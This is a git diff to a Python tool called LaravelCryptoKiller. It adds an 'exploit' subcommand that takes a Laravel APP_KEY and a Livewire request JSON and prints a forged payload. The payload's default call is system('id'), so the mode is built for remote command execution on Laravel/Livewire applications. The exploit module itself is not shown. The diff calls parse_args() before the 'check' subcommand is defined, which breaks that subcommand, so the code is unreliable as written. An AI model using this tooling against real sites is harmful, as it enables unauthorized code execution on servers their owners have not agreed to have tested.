@@ -7,6 +7,8 @@ import os
 import re
 import signal
 import json
+import importlib
+
 from tqdm import tqdm
 from concurrent.futures import ProcessPoolExecutor
 from concurrent.futures import as_completed
@@ -24,6 +26,7 @@ class LaravelCryptoKiller():
         self.number_of_serialized_data = 0
         self.results = []
         self.key_file = None
+        self.exploits = ["livewire"]
 
     """
     Function managing interuption
@@ -105,6 +108,14 @@ class LaravelCryptoKiller():
         parser = argparse.ArgumentParser(description=usage, formatter_class=argparse.RawTextHelpFormatter)
         subparsers = parser.add_subparsers(title='subcommands', description='You can use the option -h on each subcommand to get more info', dest="subparser_name")
 
+        # Exploits options
+        parser_exploit = subparsers.add_parser('exploit', help="Exploit mode")
+        parser_exploit.add_argument('--exploit', '-e', required=True, default="", help="Name of the exploit you want to run", choices=self.exploits)
+        parser_exploit.add_argument("--key", "-k", required=True, default="", help="Key used by Laravel stored in APP_KEY in .env")
+        parser_exploit.add_argument("--json", "-j", default="", help="JSON of the livewire request to exploit. Can be a raw string or a path to a file where the JSON is saved.")
+        parser_exploit.add_argument("--function", '-f', default="system", help="Function to be called")
+        parser_exploit.add_argument("--param","-p", default="id", help="Param passed to the function")
+
         # Encrypt options
         parser_encrypt = subparsers.add_parser('encrypt', help="Encrypt mode")
         parser_encrypt.add_argument("--key", "-k", default="", help="Key used by Laravel stored in APP_KEY in .env")
@@ -123,6 +134,22 @@ class LaravelCryptoKiller():
         parser_bruteforce.add_argument("--value", "-v", default="", help="Value of the laravel ciphered data on which you want to perform a bruteforce", required=False)
         parser_bruteforce.add_argument("--threads", "-t", type=int, default=10, help="Number of threads used during bruteforce (Default 10)", required=False)
         parser_bruteforce.add_argument("--result_file", default="results/results.json", help="File in which you want to save your results (default results/results.json)", required=False)
+
+        # Exploit options
+        args = parser.parse_args()
+        if args.subparser_name == "exploit":
+            exploit_imp = importlib.import_module(f"exploits.{args.exploit}")
+            if args.exploit == "livewire":
+                if len(args.json) == 0:
+                    print(f"[-] Livewire exploit needs a JSON to be exploited, usage:\n{sys.argv[0]} exploit -e livewire -k '{args.key}' -j request.json")
+                    sys.exit(1)
+                args = (args.json, args.function, args.param, args.key)
+                
+            exploit_cls = exploit_imp.ExploitEncrypter(*args)
+            payload = exploit_cls.run()
+            if len(payload) == 0:
+                sys.exit(1)
+            print(payload)
 
         # Check options
         parser_check = subparsers.add_parser('check', help="Check the validity of an "
